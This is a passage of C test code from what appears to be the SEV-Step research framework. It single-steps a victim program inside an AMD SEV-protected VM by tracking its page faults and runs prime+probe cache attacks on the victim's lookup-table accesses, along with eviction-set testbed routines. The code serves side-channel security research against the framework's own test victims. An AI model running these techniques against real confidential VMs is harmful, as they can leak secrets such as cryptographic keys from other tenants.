        exit_code = HOST_CLIENT_ERROR;
        goto cleanup;
    }

    printf("%s%s:%d Victim program GPA is 0x%lx and VADDR is 0x%lx\n",fp,__FILE__,__LINE__,
        victim_program_data->gpa,victim_program_data->vaddr);
    printf("%s%s:%d Lookup table has GPA 0x%lx and VADDR 0x%lx and is 0x%lx bytes long\n",fp,__FILE__,__LINE__,
        victim_program_data->cache_attack_data->lookup_table_gpa,victim_program_data->cache_attack_data->lookup_table_vaddr,
        victim_program_data->cache_attack_data->lookup_table_bytes);



    usp_poll_api_ctx_t ctx;
    printf("%s%s:%d Initializing API...\n",fp,__FILE__,__LINE__);
    if(SEV_STEP_ERR == usp_new_ctx(&ctx,args->check_debug_rip)) {
        printf("%s%s:%d" BRED "usp_new_ctx failed." reset " Check dmesg for more information\n",
            fp,__FILE__,__LINE__);
        exit_code = HOST_CLIENT_ERROR;
        goto cleanup;
    }
    printf("%s%s:%d API initialization done!\n",fp,__FILE__,__LINE__);
    api_open = true;

    lookup_table_t lut = {
        //GPA is correct here, need to refactor lookup_table_t to support both gpa and gva
        .base_vaddr_table = victim_program_data->cache_attack_data->lookup_table_gpa,
        .table_bytes = victim_program_data->cache_attack_data->lookup_table_bytes,
    };
    build_eviction_set_param_t build_ev_req = {
        .attack_targets = &lut,
        .attack_targets_len = 1,
        .cache_attack_perf = host_os_l1d_fill_from_memory,
    };

    printf("%s%s:%d Requesting ev build...\n",fp,__FILE__,__LINE__);
    if(SEV_STEP_ERR == sev_step_build_alias_evs(&ctx,&build_ev_req)) {
        printf("%s%s:%d" BRED "sev_step_build_alias_evs failed."reset,
            fp,__FILE__,__LINE__);
        exit_code = HOST_CLIENT_ERROR;
        goto cleanup;
    }




    //
    // Exec track gpa of victim function and signal vm server to start victim program async
    // Then, enter main event loop
    //

    printf("%stracking gpa 0x%lx with mode %s\n",fp,victim_program_data->gpa,tracking_mode_to_string(KVM_PAGE_TRACK_EXEC));
    if( SEV_STEP_OK != track_page(&ctx,victim_program_data->gpa,KVM_PAGE_TRACK_EXEC) ) {
        printf("%sinitial track page for 0x%lx" BRED " FAILED\n" reset,fp,victim_program_data->gpa);
        exit_code = HOST_CLIENT_ERROR;
        goto cleanup;
    }

    printf("%scalling vm_server_single_step_victim_start\n",fp);
    if ( HOST_CLIENT_ERROR == vm_server_single_step_victim_start(victim_program) ) {
        printf("%svm_server_single_step_victim_start " BRED "FAILED\n" reset,fp);
        exit_code = HOST_CLIENT_ERROR;
        goto cleanup;
    }

    printf("%sentering main event loop\n",fp);

    //if true, the last page fault event belonged to the target pages
    bool on_victim_pages = false;

    uint64_t single_steps_on_target = 0;

    /*We expect the victim program do be done after this many events. Contains some slack to account for scheduling and zero steps
    vicim_program_data.expected_offsets_len is the exact number of instructions/single step events for the target
    */
    int upper_event_thresh = 20 * victim_program_data->expected_offsets_len;
    //if true, we have single stepped through the whole target program successfully
    bool finished_single_stepping_target = false;

    bool do_cache_attack_until_next_single_step = false;
    uint64_t expected_cache_attack_offset = 0;

    for( int current_event_idx = 0; current_event_idx < upper_event_thresh && !finished_single_stepping_target; current_event_idx++) {

        printf("%sWaiting next event, event_idx=%d\n",fp,current_event_idx);
        if( SEV_STEP_ERR == usp_block_until_event(&ctx,&event_type,&event_buffer) ) {
            printf("%susp_block_until_event" BRED " FAILED\n" reset,fp);
            exit_code = HOST_CLIENT_ERROR;
            goto cleanup;
        }

        
        if( event_type == PAGE_FAULT_EVENT ) {
            usp_page_fault_event_t* pf_event = (usp_page_fault_event_t*)event_buffer;
            printf("%s Pagefault Event: {GPA:0x%lx}\n",fp,pf_event->faulted_gpa);

            if( on_victim_pages ) {
                if( pf_event->faulted_gpa == victim_program_data->gpa ) {
                    printf("%s on_victim_pages=true but got fault for victim page! This should not happen\n",fp);
                    exit_code = HOST_CLIENT_ERROR;
                    goto cleanup;
                } else {
                    printf("%s Left victim pages with fault at GPA 0x%lx. Disabling single stepping and re-tracking victim pages\n",
                        fp,pf_event->faulted_gpa);
                    if( SEV_STEP_OK != disable_single_stepping(&ctx) ) {
                        printf("%sfailed to disable single stepping\n",fp);
                        exit_code = HOST_CLIENT_ERROR;
                        goto cleanup;
                    }

                    //track only the target page
                    if( SEV_STEP_OK != untrack_all_pages(&ctx,KVM_PAGE_TRACK_EXEC)) {
                        printf("%suntrack_all_pages failed\n",fp);
                        exit_code = HOST_CLIENT_ERROR;
                        goto cleanup;
                    }
                    if( SEV_STEP_OK != track_page(&ctx,victim_program_data->gpa,KVM_PAGE_TRACK_EXEC)) {
                        printf("%sfailed to to track victim page\n",fp);
                        exit_code = HOST_CLIENT_ERROR;
                        goto cleanup;
                    }
                    on_victim_pages = false;
                }
            } else { //currently not on victim pages
                if( pf_event->faulted_gpa == victim_program_data->gpa ) {
                    printf("%s entering victim pages. enabling single stepping (timer 0x%x) and tracking all but the target page\n",
                        fp,args->timer_value);
                    
                    //track all pages but the target page
                    if( SEV_STEP_OK != track_all_pages(&ctx,KVM_PAGE_TRACK_EXEC)) {
                        printf("%strack_all_pages failed\n",fp);
                        exit_code = HOST_CLIENT_ERROR;
                        goto cleanup;
                    }
                    if( SEV_STEP_OK != untrack_page(&ctx,victim_program_data->gpa,KVM_PAGE_TRACK_EXEC)) {
                        printf("%suntrack_page failed\n",fp);
                        exit_code = HOST_CLIENT_ERROR;
                        goto cleanup;
                    }

                    if( SEV_STEP_OK != enable_single_stepping(&ctx,args->timer_value,&victim_program_data->gpa,1) ) {
                        printf("%sfailed to enable single stepping\n",fp);
                        exit_code = HOST_CLIENT_ERROR;
                        goto cleanup;
                    }

                    on_victim_pages = true;
                } else {
                    printf("currently not on victim pages and page fault is not on victim pages : nothing to do\n");
                }
            }
        } else if( event_type == SEV_STEP_EVENT) {
            sev_step_event_t* step_event = (sev_step_event_t*)event_buffer;
            print_single_step_event(fp,step_event);
            
            if(step_event->cache_attack_timings != NULL ) {
                //we pass "1" for "way count" argument here, because we only have one prime/probe
                //address per cache set in this attack.
                print_cache_timings(fp,step_event->cache_attack_timings,
                step_event->cache_attack_perf_values,step_event->cache_attack_data_len,
                1,lut.base_vaddr_table,expected_cache_attack_offset);
            }

            if( !on_victim_pages ) {
                printf("%s on_victim_pages=false but single step event. This should not happen\n",fp);
                exit_code = HOST_CLIENT_ERROR;
                goto cleanup;
            }

            switch (step_event->counted_instructions) {
            case 0:

                if( do_cache_attack_until_next_single_step ) {
                    printf("%sZero Stepped, re-priming cache\n",fp);
                    if( SEV_STEP_OK != sev_step_do_cache_attack_next_step(&ctx,0,false,0)) {
                        printf("%sev_step_do_cache_attack_next_step failed\n",fp);
                        exit_code = HOST_CLIENT_ERROR;
                        goto cleanup;
                    }
                }

                break;
            case 1:
                single_steps_on_target += 1;

                do_cache_attack_until_next_single_step = false;

                if( args->check_debug_rip && (single_steps_on_target < victim_program_data->expected_offsets_len) ) {
                    if( !step_event->is_decrypted_vmsa_data_valid ) {
                        printf("%s"BHRED"NO VMSA DATA"reset" but check debug rip requested!\n",fp);
                        exit_code = HOST_CLIENT_ERROR;
                        goto cleanup;
                    }
                    uint64_t expected_vaddr = victim_program_data->vaddr + victim_program_data->expected_offsets[single_steps_on_target-1];
                    uint64_t rip = step_event->decrypted_vmsa_data.register_values[VRN_RIP];
                    if( (rip >> 12) != (expected_vaddr >> 12 )) {
                         printf("%s"BHRED "vaddr check failed: page part of vaddr is wrong, single_steps_on_target = %ju,"
                            "expected vaddr 0x%lx got 0x%lx\n" reset,
                            fp,single_steps_on_target,expected_vaddr,rip);
                        exit_code = HOST_CLIENT_ERROR;
                        goto cleanup;
                    }
                    if( rip != expected_vaddr ) {
                        printf("%s"BHRED "vaddr check failed:  single_steps_on_target = %ju,"
                            " page part correct, expected page offset 0x%lx got 0x%lx\n" reset,
                            fp,single_steps_on_target,expected_vaddr & 0xfff,rip & 0xfff);
                        exit_code = HOST_CLIENT_ERROR;
                        goto cleanup;
                    } 
                    printf("%s step event is at expected vaddr\n",fp);
                }

                //Check if we should perform a cache attack. Remember. RIP points to next instruction
                if ( (single_steps_on_target-1) < victim_program_data->expected_offsets_len ) {
                    uint64_t assumed_offset = victim_program_data->expected_offsets[single_steps_on_target-1];
                    int cache_attack_idx;
                    for( uint64_t i = 0; i < victim_program_data->cache_attack_data->len; i++) {
                        if( victim_program_data->cache_attack_data->offsets_with_mem_access[i] == assumed_offset ) {
                            do_cache_attack_until_next_single_step = true;
                            cache_attack_idx = i;
                            break;
                        }
                    }

                    if( do_cache_attack_until_next_single_step ) {
                        printf("%sRequesting Cache Attack\n",fp);
                        expected_cache_attack_offset = victim_program_data->cache_attack_data->mem_access_target_offset[cache_attack_idx];
                        printf("%s"BHYEL"Expecting an access to offset 0x%lx\n"reset,fp,expected_cache_attack_offset);
                        if( SEV_STEP_OK != sev_step_do_cache_attack_next_step(&ctx,0,false,0)) {
                            printf("%sev_step_do_cache_attack_next_step failed\n",fp);
                            exit_code = HOST_CLIENT_ERROR;
                            goto cleanup;
                        }
                    }
                }
             

               

                if( single_steps_on_target > victim_program_data->expected_offsets_len ) {
                    printf("%sFinished single stepping target program !\n",fp);
                    finished_single_stepping_target = true;
                }
               
                break;
            default:
                printf("%s" BHRED "MULTISTEP"reset,fp);
                exit_code = HOST_CLIENT_ERROR;
                goto cleanup;
                break;
            }       
        } else {
            printf("%s Unexpected event type! Aborting\n",fp);
            exit_code = HOST_CLIENT_ERROR;
            goto cleanup;
        }

        printf("%ssending ack for event_idx %d\n",fp,current_event_idx);
        free_usp_event(event_type,event_buffer);
        event_buffer = NULL;
        usp_ack_event(&ctx);
       
    } //end of main event loop
    
    
    if( SEV_STEP_OK != disable_single_stepping(&ctx) ) {
        printf("%sfailed to disable single stepping\n",fp);
        exit_code = HOST_CLIENT_ERROR;
        goto cleanup;
    }

    printf("%s%s:%d Calling sev_step_free_evs\n",fp,__FILE__,__LINE__);
    if( SEV_STEP_ERR == sev_step_free_evs(&ctx) ) {
        printf("%s%s:%d sev_step_free_evs" BRED "FAILED\n" reset,
            fp,__FILE__,__LINE__);
        exit_code = HOST_CLIENT_ERROR;
        goto cleanup;
    }

    printf("%sClosing API...\n",fp);
    if(SEV_STEP_ERR == usp_close_ctx(&ctx)) {
        printf("%s" BRED "usp_close_ctx failed." reset " Check dmesg for more information\n",fp);
        exit_code = HOST_CLIENT_ERROR;
        api_open = false;
        goto cleanup;
    } else {
        printf("%sAPI closed!\n",fp);
    }
    api_open = false;

    if( !finished_single_stepping_target ) {
        printf("%s" BHRED "Did not finish target!. Wanted %lu single step events on target, got only %ju\n" reset,
            fp,victim_program_data->expected_offsets_len,single_steps_on_target);
        exit_code = HOST_CLIENT_ERROR;
        goto cleanup;
    };



  

    //
    // interact with the vm to ensure that it is not stuck
    //
    bool vm_alive = false;
    for( int retries = 1; !vm_alive && retries >= 0; retries--) {
        victim_program_data_t* _dummy = malloc(sizeof(victim_program_data_t));
        printf("%ssending dummy request to vm to ensure that it is alive and well\n",fp);
        if ( HOST_CLIENT_ERROR == vm_server_single_step_victim_init(VICTIM_PROGRAM_NOP_SLIDE,_dummy) ) {
            printf("%sdummy request " BRED "FAILED. %d retries remaining\n" reset,fp,retries);
        } else {
            vm_alive = true;
        }
        free_victim_program_data_t(_dummy);

    }

    if( vm_alive ) {
            printf("%s VM seems to be alive and well\n",fp);
    } else {
            printf("%svm is stuck\n",fp);
            exit_code = HOST_CLIENT_ERROR;
            goto cleanup;
    }

    cleanup:

    if( api_open ) {
        printf("%s%s:%d Closing API...\n",fp,__FILE__,__LINE__);
        if(SEV_STEP_ERR == usp_close_ctx(&ctx)) {
            printf("%s%s:%d " BRED "usp_close_ctx failed." reset " Check dmesg for more information\n",
            fp,__FILE__,__LINE__);
            exit_code = HOST_CLIENT_ERROR;
        } else {
            printf("%s%s:%d API closed!\n",fp,__FILE__,__LINE__);
        }
    }

    if(event_buffer != NULL ) {
        free_usp_event(event_type,event_buffer);
    }

    if( victim_program_data != NULL ) {
        free_victim_program_data_t(victim_program_data);
    }
   

    return exit_code;
}







int test_cache_attack_testbed(char* fp, void* void_args) {
    (void)void_args;
    int exit_code = HOST_CLIENT_SUCCESS;
    bool api_open = false;

    //
    //Preparing eviction set in user space. Target does not matter. Just need the data structure to have something to
    //import into the kernel
    //

    void* victim_table = mmap(NULL,4096,PROT_READ | PROT_WRITE, MAP_SHARED | MAP_ANONYMOUS | MAP_POPULATE, 0, 0);
    lookup_table_t lut1 = {
        .base_vaddr_table = (uint64_t)victim_table,
        .table_bytes = 16*64,
    };
    lookup_table_t lut2 = {
        .base_vaddr_table = lut1.base_vaddr_table,
        .table_bytes = lut1.table_bytes,
    };

    lookup_table_eviction_set_t lookup_table_eviction_set1;
    lookup_table_eviction_set_t lookup_table_eviction_set2;
    uint8_t** lookup_table_base_mappings1 = NULL;
    uint8_t** lookup_table_base_mappings2 = NULL;
    uint64_t lookup_table_base_mappings1_len;
    uint64_t lookup_table_base_mappings2_len;
    uint64_t way_count = 8;;

    //N.B: We just want to get some real physical address here, as we do not use this
    //eviction set with a real target in the vm anyways
    uint64_t paddr;
    if( virt_to_phys_user(&paddr,getpid(),lut1.base_vaddr_table) ) {
        printf("%s%s:%d virt_to_phys_user failed\n",fp,__FILE__,__LINE__);
        exit_code = HOST_CLIENT_ERROR;
        goto cleanup;
    }
    printf("Victim paddr 0%jx\n",paddr);
    printf("Allocating first eviction set for table...\n");
    if( SEV_STEP_ERR == epyc3_build_l2_eviction_set_for_lookup_table_parallel_reuse(&paddr,1,lut1.table_bytes,
        &lookup_table_eviction_set1,&lookup_table_base_mappings1,&lookup_table_base_mappings1_len, way_count) ) {

        printf("%s%s:%d : epyc3_build_l2_eviction_set_for_lookup_table:" BHRED " FAILED\n"reset,fp,__FILE__,__LINE__);
        exit_code = HOST_CLIENT_ERROR;
        goto cleanup;
    }

    printf("Allocating second eviction set for table...\n");
    if( SEV_STEP_ERR == epyc3_build_l2_eviction_set_for_lookup_table_parallel_reuse(&paddr,1,lut2.table_bytes,
        &lookup_table_eviction_set2, &lookup_table_base_mappings2,&lookup_table_base_mappings2_len ,way_count) ) {

        printf("%s%s:%d : epyc3_build_l2_eviction_set_for_lookup_table:" BHRED " FAILED\n"reset,fp,__FILE__,__LINE__);
        exit_code = HOST_CLIENT_ERROR;
        goto cleanup;
    }

    lookup_table_t luts[] = {lut1,lut2};
    lookup_table_eviction_set_t evs[] = {lookup_table_eviction_set1,lookup_table_eviction_set2};
    import_user_eviction_set_param_t api_params = {
        .attack_targets = luts,
        .eviction_sets = evs,
        .len = 2,
        .way_count = way_count,
        .cache_attack_perf = host_os_l2_hit_from_l1_dc_miss,
    };
    printf("%s%s:%d Got %lu lut and %lu eviction sets with %lu entries each\n",
        fp,__FILE__,__LINE__,api_params.len,api_params.eviction_sets->eviction_sets_len,
        api_params.way_count);

    //
    // Call API
    //


    usp_poll_api_ctx_t ctx;
    printf("%s%s:%d Initializing API...\n",fp,__FILE__,__LINE__);
    if(SEV_STEP_ERR == usp_new_ctx(&ctx,false)) {
        printf("%s%s:%d" BRED "usp_new_ctx failed." reset " Check dmesg for more information\n",
            fp,__FILE__,__LINE__);
        exit_code = HOST_CLIENT_ERROR;
        goto cleanup;
    }
    printf("%s%s:%d API initialization done!\n",fp,__FILE__,__LINE__);
    api_open = true;


    printf("%s%s:%d Calling sev_step_import_user_evs\n",fp,__FILE__,__LINE__);
    if( SEV_STEP_ERR == sev_step_import_user_evs(&ctx,&api_params) ) {
         printf("%s%s:%d sev_step_import_user_evs" BRED "FAILED\n" reset,
            fp,__FILE__,__LINE__);
        exit_code = HOST_CLIENT_ERROR;
        goto cleanup;
    }


    printf("%s%s:%d Calling sev_step_cache_attack_testbed,",fp,__FILE__,__LINE__);
    if( SEV_STEP_ERR == sev_step_cache_attack_testbed(&ctx) ) {
        printf("%s%s:%d sev_step_cache_attack_testbed" BRED "FAILED\n" reset,
            fp,__FILE__,__LINE__);
        exit_code = HOST_CLIENT_ERROR;
        goto cleanup;
    }


    printf("%s%s:%d Calling sev_step_free_evs\n",fp,__FILE__,__LINE__);
    if( SEV_STEP_ERR == sev_step_free_evs(&ctx) ) {
        printf("%s%s:%d sev_step_free_evs" BRED "FAILED\n" reset,
            fp,__FILE__,__LINE__);
        exit_code = HOST_CLIENT_ERROR;
        goto cleanup;
    }


    cleanup:
    munmap(victim_table,4096);
    if( lookup_table_base_mappings1 != NULL ) {
        epyc3_free_reuse_lookup_table_eviction_set(lookup_table_eviction_set1, 
            lookup_table_base_mappings1, lookup_table_base_mappings1_len
        );
    }
    if( lookup_table_base_mappings2 != NULL ) {
        epyc3_free_reuse_lookup_table_eviction_set(lookup_table_eviction_set2,
            lookup_table_base_mappings2, lookup_table_base_mappings2_len
        );
    }


    if( api_open ) {
        printf("%s%s:%d Closing API...\n",fp,__FILE__,__LINE__);
        if(SEV_STEP_ERR == usp_close_ctx(&ctx)) {
            printf("%s%s:%d " BRED "usp_close_ctx failed." reset " Check dmesg for more information\n",
            fp,__FILE__,__LINE__);
            exit_code = HOST_CLIENT_ERROR;
        } else {
            printf("%s%s:%d API closed!\n",fp,__FILE__,__LINE__);
        }
    }
   

    return exit_code;

}

int test_cache_attack_testbed_aliasing(char* fp, void* void_args) {
    (void)void_args;
    int exit_code = HOST_CLIENT_SUCCESS;
    bool api_open = false;

    //
    // Setup Eviction Set
    //
    victim_program_data_t victim_program_data;
    printf("%s%s:%d calling vm_server_single_step_victim_init to prepare scenario\n",fp,__FILE__,__LINE__);
    if ( HOST_CLIENT_ERROR == vm_server_single_step_victim_init(VICTIM_PROGRAM_SIMPLE_CACHE_VICTIM,&victim_program_data) ) {
        printf("%s%s:%d vm_server_single_step_victim_init " BRED "FAILED\n" reset,fp,__FILE__,__LINE__);
        exit_code = HOST_CLIENT_ERROR;
        goto cleanup;
    }

    printf("%s%s:%d Victim program GPA is 0x%lx and VADDR is 0x%lx\n",fp,__FILE__,__LINE__,
        victim_program_data.gpa,victim_program_data.vaddr);
    printf("%s%s:%d Lookup table has GPA 0x%lx and VADDR 0x%lx and is 0x%lx bytes long\n",fp,__FILE__,__LINE__,
        victim_program_data.cache_attack_data->lookup_table_gpa,victim_program_data.cache_attack_data->lookup_table_vaddr,
        victim_program_data.cache_attack_data->lookup_table_bytes);


    usp_poll_api_ctx_t ctx;
    printf("%s%s:%d Initializing API...\n",fp,__FILE__,__LINE__);
    if(SEV_STEP_ERR == usp_new_ctx(&ctx,false)) {
        printf("%s%s:%d" BRED "usp_new_ctx failed." reset " Check dmesg for more information\n",
            fp,__FILE__,__LINE__);
        exit_code = HOST_CLIENT_ERROR;
        goto cleanup;
    }
    printf("%s%s:%d API initialization done!\n",fp,__FILE__,__LINE__);
    api_open = true;

    lookup_table_t luts[] = {
        {
            //GPA is correct here, need to refactor lookup_table_t to support both gpa and gva
            .base_vaddr_table = victim_program_data.cache_attack_data->lookup_table_gpa,
            .table_bytes = victim_program_data.cache_attack_data->lookup_table_bytes,
        },
        {
            //GPA is correct here, need to refactor lookup_table_t to support both gpa and gva
            .base_vaddr_table = victim_program_data.cache_attack_data->lookup_table_gpa,
            .table_bytes = victim_program_data.cache_attack_data->lookup_table_bytes,
        },
    };
   
    build_eviction_set_param_t build_ev_req = {
        .attack_targets = luts,
        .attack_targets_len = 2,
        .cache_attack_perf = host_os_l2_hit_from_l1_dc_miss,
    };

    printf("%s%s:%d Requesting ev build...\n",fp,__FILE__,__LINE__);
    if(SEV_STEP_ERR == sev_step_build_alias_evs(&ctx,&build_ev_req)) {
        printf("%s%s:%d" BRED "sev_step_build_alias_evs failed."reset,
            fp,__FILE__,__LINE__);
        exit_code = HOST_CLIENT_ERROR;
        goto cleanup;
    }



   printf("%s%s:%d Calling sev_step_cache_attack_testbed,",fp,__FILE__,__LINE__);
    if( SEV_STEP_ERR == sev_step_cache_attack_testbed(&ctx) ) {
        printf("%s%s:%d sev_step_cache_attack_testbed" BRED "FAILED\n" reset,
            fp,__FILE__,__LINE__);
        exit_code = HOST_CLIENT_ERROR;
        goto cleanup;
    }





    cleanup:
    if( api_open ) {

        printf("%s%s:%d Calling sev_step_free_evs\n",fp,__FILE__,__LINE__);
        if( SEV_STEP_ERR == sev_step_free_evs(&ctx) ) {
        printf("%s%s:%d sev_step_free_evs" BRED "FAILED\n" reset,
            fp,__FILE__,__LINE__);
        exit_code = HOST_CLIENT_ERROR;
        goto cleanup;
    }

        printf("%s%s:%d Closing API...\n",fp,__FILE__,__LINE__);
        if(SEV_STEP_ERR == usp_close_ctx(&ctx)) {
            printf("%s%s:%d " BRED "usp_close_ctx failed." reset " Check dmesg for more information\n",
            fp,__FILE__,__LINE__);
            exit_code = HOST_CLIENT_ERROR;
        } else {
            printf("%s%s:%d API closed!\n",fp,__FILE__,__LINE__);
        }
    }
   

    return exit_code;

}
#endif